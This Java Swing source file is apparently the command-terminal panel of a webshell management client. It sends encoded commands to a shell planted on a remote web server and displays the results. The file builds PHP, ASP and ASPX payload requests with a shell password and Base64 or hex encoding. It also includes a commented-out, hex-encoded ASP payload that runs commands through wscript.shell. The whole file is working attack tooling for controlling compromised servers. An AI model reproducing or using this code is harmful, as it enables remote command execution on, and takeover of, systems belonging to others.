package com.mypack.UI;

import java.awt.Color;
import java.awt.Font;
import java.awt.Rectangle;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.net.URLEncoder;
import java.util.Map;

import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.text.BadLocationException;

import com.mypack.util.AnalysisClass;
import com.mypack.util.Base64;
import com.mypack.util.HttpClass;

public class CMDPanel extends JPanel {

	/**
	 * Create the panel.
	 * @param main 
	 * @param scriptType 
	 * @param password 
	 * @param url 
	 * @param id 
	 */
	private JTextArea textArea;
	private String id;
	private String url;
	private String password;
	private String scriptType;
	private Main main;
	private HttpClass http;
	private Map<String, String> payload;
	private String	postText ;
	private String temp;
	private AnalysisClass analysisClass;
	private int len ;
	private String path;
	private String execTool;
	public CMDPanel(String id, String url, String password, String scriptType, Main main) {
		this.id = id;
		this.url = url;
		this.password = password;
		this.scriptType = scriptType;
		this.main = main;
		this.payload = main.getPayload();

		analysisClass = new AnalysisClass(payload);
		http = new HttpClass(analysisClass,payload);
		setLayout(null);
		
		JScrollPane scrollPane = new JScrollPane();

		scrollPane.setBounds(14, 13, 887, 493);
		add(scrollPane);
		
		textArea = new JTextArea();
		textArea.setLineWrap(true);
		textArea.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent arg0) {
				try {
					Rectangle rec = textArea.modelToView(textArea.getCaretPosition());
					int row =  rec.y / rec.height + 1;
					if(textArea.getLineCount()<=row){
						textArea.setEditable(true);
					}else{
						textArea.setEditable(false);
					}
				} catch (BadLocationException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		});
		
		textArea.setFont(new Font("宋体", Font.BOLD, 20));
		textArea.addKeyListener(new KeyAdapter() {
			@Override
			public void keyPressed(KeyEvent arg0) {
				if(arg0.getKeyCode()==8){
					try {
						String tt  = textArea.getText(textArea.getLineStartOffset(textArea.getLineCount()-1), textArea.getLineEndOffset(textArea.getLineCount()-1) - textArea.getLineStartOffset(textArea.getLineCount()-1) - 1); 
						if(tt.length()<len){
							textArea.setEditable(false);
							textArea.setCaretPosition( textArea.getDocument().getLength());
						}else{
							textArea.setEditable(true);
						}
					} catch (BadLocationException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				if(arg0.getKeyChar()==KeyEvent.VK_ENTER ){
					//cmd = textArea.getText(textArea.getLineStartOffset(textArea.getLineCount()-1), textArea.getLineEndOffset(textArea.getLineCount()-1) - textArea.getLineStartOffset(textArea.getLineCount()-1) - 1);
					String[] i = textArea.getText().split("\n");
					String cmd = i[i.length-1];
		        	if(cmd!=null && cmd.length()>0){
		        		textArea.append("\r\n");
						execCmd(cmd.replace(path, ""));
						arg0.consume();
		        	}
			       
				}
			}
		});
		textArea.setForeground(Color.GREEN);
		textArea.setBackground(Color.BLACK);
		scrollPane.setViewportView(textArea);
		int i =get_Index();
		if(i==1){
			execTool="cmd";
			execCmd("ver");
		}else if(i==2){
			execTool="/bin/sh";
			execCmd("uname -a");
		}
	}
	public void execCmd(String cmd){
		postText="";
		temp = "";
		if(execTool.equals("cmd")){
		temp = "cd/d\""+path.trim()+"\"&"+cmd+"&echo [S]&cd&echo [E]";
		}else{
		temp = "cd \""+path.trim()+"\";"+cmd+";echo [S];pwd;echo [E]";
		}
		if(scriptType.toUpperCase().equals("PHP")){
			postText= password+"="+payload.get(scriptType.toUpperCase()+"_MAKE")+"&"+payload.get("ACTION")+"="+payload.get(scriptType.toUpperCase()+"_SHELL")+"&"+payload.get("PARAM1")+"="+Base64.encodeBase64(execTool.getBytes())+"&"+payload.get("PARAM2")+"="+Base64.encodeBase64(temp.getBytes());
		}
		if(scriptType.toUpperCase().equals("ASP")){
			postText = password+"="+payload.get(scriptType.toUpperCase()+"_MAKE");
			postText = postText.replace("PAYLOAD", Base64.str2HexStr(payload.get(scriptType.toUpperCase()+"_SHELL").replace("PARAM1", payload.get("PARAM1")).replace("PARAM2", payload.get("PARAM2"))));
			postText = postText+"&"+payload.get("PARAM1")+"="+Base64.str2HexStr(execTool)+"&"+payload.get("PARAM2")+"="+Base64.str2HexStr(temp);
//			System.out.println(execTool);
//			postText = "v=Execute(\"Execute(\"\"On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53657420583d4372656174654f626a6563742822777363726970742e7368656c6c22292e657865632822222222266264285265717565737428227a3122292926222222202f6320222222266264285265717565737428227a322229292622222222293a496620457272205468656e3a533d225b4572725d2022264572722e4465736372697074696f6e3a4572722e436c6561723a456c73653a4f3d582e5374644f75742e52656164416c6c28293a453d582e5374644572722e52656164416c6c28293a533d4f26453a456e642049663a526573706f6e73652e7772697465285329\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=636d64&z2=6364202f642022453a5c7777775c2226766172266563686f205b535d266364266563686f205b455d";
}
		if(scriptType.toUpperCase().equals("ASPX")){
			postText = password+"="+payload.get(scriptType.toUpperCase()+"_MAKE");
			postText = postText.replace("PAYLOAD", payload.get(scriptType.toUpperCase()+"_SHELL"));
			postText = postText+"&"+payload.get("PARAM1")+"="+execTool+"&"+payload.get("PARAM2")+"="+URLEncoder.encode(temp);
		}
		String   respond = http.postSend(url, postText);
		System.out.println(respond);
		String resule = respond.substring(respond.indexOf(payload.get("SPL"))+1, respond.indexOf("[S]")); //回显容易被截取出错
		textArea.append(resule);
		path =respond.substring(respond.indexOf("[S]")+3,respond.indexOf("[E]")).trim()+"/";
		//textArea.append(execTool.equals("cmd")?path.trim()+"\\":path.trim());
		textArea.append(path);
		len = path.length();
	}
	private int get_Index() {
		// TODO Auto-generated method stub
		String[] temp = null;
		if(payload.get(scriptType.toUpperCase()+"_MAKE").indexOf("PAYLOAD")!=-1){
			postText = password+"="+payload.get(scriptType.toUpperCase()+"_MAKE");
			postText = postText.replace("PAYLOAD", payload.get(scriptType.toUpperCase()+"_INDEX"));
		}else{
			postText = password+"="+payload.get(scriptType.toUpperCase()+"_MAKE")+"&"+payload.get("ACTION")+"="+payload.get(scriptType.toUpperCase()+"_INDEX");
		}
		String resultText = http.postSend(url, postText);
		
		temp = analysisClass.resultAnalysis(resultText,"\t");
		if(temp!=null && temp.length>0){
			if(temp[0].indexOf(":")!=-1 || temp[2].indexOf("Win")!=-1){
				path = temp[0].trim().replace("/", "\\");
				return 1;
			}else{
				path = temp[0].trim();
				return 2;
			}
		}
		return 0;
	}
}
